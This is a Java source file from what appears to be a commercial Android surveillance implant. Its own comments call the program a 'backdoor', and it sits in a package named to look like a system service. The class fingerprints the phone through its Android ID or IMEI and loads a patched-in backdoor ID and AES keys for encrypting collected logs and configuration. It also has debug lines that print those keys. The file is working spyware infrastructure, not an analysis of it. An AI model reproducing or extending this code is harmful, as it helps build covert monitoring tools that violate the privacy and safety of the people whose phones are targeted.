/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.crypto;

import java.util.Arrays;

import android.content.Context;
import android.content.res.Resources;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import com.android.service.Device;
import com.android.service.Messages;
import com.android.service.R;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.Utils;

// This class should only be read by Device
/**
 * The Class Keys.
 */
public class Keys {
	private static final String TAG = "Keys"; //$NON-NLS-1$
	/** The singleton. */
	private volatile static Keys singleton;
	private static int keyLen = 16;

	// Subversion
	/** The Constant g_Subtype. */
	private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
	// 'D' };

	// 20 bytes that uniquely identifies the device (non-static on purpose)
	/** The g_ instance id. */
	private static byte[] instanceId;

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	/** The Constant g_BackdoorID. */
	private static byte[] backdoorId;

	// AES key used to encrypt logs
	/** The Constant g_AesKey. */
	private static byte[] aesKey;

	// AES key used to decrypt configuration
	/** The Constant g_ConfKey. */
	private static byte[] confKey;

	// Challenge key
	/** The Constant g_Challenge. */
	private static byte[] challengeKey;
	
	// Demo key
	private static byte[] demoMode;
	
	/**
	 * Self.
	 * 
	 * @return the keys
	 */
	public static Keys self() {
		if (singleton == null) {
			synchronized (Keys.class) {
				if (singleton == null) {
					if (Cfg.KEYS) {
						singleton = new KeysFake();

						if (Cfg.DEBUG) {
							Check.log(TAG + " Using hardcoded keys");
						}
					} else {
						singleton = new Keys(true);

						if (Cfg.DEBUG) {
							Check.log(TAG + " Using binary patched keys");
						}
					}
				}
			}
		}

		return singleton;
	}

	protected Keys(boolean fromResources) {
		if (fromResources) {
			final Resources resources = Status.getAppContext().getResources();

			String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);

			if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
				// http://code.google.com/p/android/issues/detail?id=10603
				// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
				final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
						Context.TELEPHONY_SERVICE);

				final String imei = telephonyManager.getDeviceId();
				androidId = imei;
			}

			instanceId = Encryption.SHA1(androidId.getBytes());

			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin

			backdoorId = Utils.copy(resource, 0, 14);
			aesKey = keyFromString(resource, 14, 32);
			confKey = keyFromString(resource, 46, 32);
			challengeKey = keyFromString(resource, 78, 32);
			demoMode = keyFromString(resource, 110, 32);

			if (Cfg.DEBUG) {
				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));//$NON-NLS-1$
				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));//$NON-NLS-1$
				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey));//$NON-NLS-1$
				Check.log(TAG + " demoMode: " + Utils.byteArrayToHex(demoMode));//$NON-NLS-1$
			}
			
			if (isDemo()) {
				Cfg.DEMO = true;
			}
		}
	}

	public boolean isDemo() {
		byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
		
		byte[] calculated = Encryption.MD5(demoMode);
		
		boolean ret = Arrays.equals(calculated, demoDigest);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (isDemo): " + ret); //$NON-NLS-1$
		}
		
		return ret;
	}

	/**
	 * Check. for been binary patched. //$NON-NLS-1$
	 * 
	 * @return true, if successful
	 */
	public boolean hasBeenBinaryPatched() {
		return Utils.equals(backdoorId, 0, new byte[] { 'a', 'v', '3', 'p', 'V', 'c', 'k', '1', 'g', 'b', '4', 'e' },
				0, 12);
	}

	/**
	 * Gets the aes key.
	 * 
	 * @return the aes key
	 */
	public byte[] getAesKey() {
		return aesKey;
	}

	/**
	 * Gets the challenge key.
	 * 
	 * @return the challenge key
	 */
	public byte[] getChallengeKey() {
		return challengeKey;
	}

	/**
	 * Gets the conf key.
	 * 
	 * @return the conf key
	 */
	public byte[] getConfKey() {
		return confKey;
	}

	/**
	 * Gets the instance id.
	 * 
	 * @return the instance id
	 */
	public byte[] getInstanceId() {
		return instanceId;
	}

	/**
	 * Gets the builds the id.
	 * 
	 * @return the builds the id
	 */
	public byte[] getBuildId() {
		return backdoorId;
	}

	/**
	 * Gets the subtype.
	 * 
	 * @return the subtype
	 */
	public byte[] getSubtype() {
		return subtype;
	}

	private byte[] keyFromString(byte[] resource, int from, int len) {
		final byte[] res = Utils.copy(resource, from, len);
		byte[] ret = keyFromString(new String(res));

		if (ret == null) {
			return Utils.copy(resource, from, 16);
		} else {
			return ret;
		}
	}

	private byte[] keyFromString(final String string) {
		try {
			final byte[] array = new byte[keyLen];

			for (int pos = 0; pos < keyLen; pos++) {
				final String repr = string.substring(pos * 2, pos * 2 + 2);
				array[pos] = (byte) Integer.parseInt(repr, 16);
			}

			return array;
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			return null;
		}
	}

}
